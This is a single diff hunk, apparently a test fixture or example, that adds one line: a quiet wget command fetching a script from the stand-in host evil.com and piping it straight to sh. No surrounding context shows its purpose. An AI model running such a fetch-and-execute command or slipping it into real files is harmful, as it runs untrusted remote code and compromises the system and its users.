@@ -1,0 +1,1 @@
+/usr/bin/wget -q -O - https://www.evil.com/evil.sh | sh
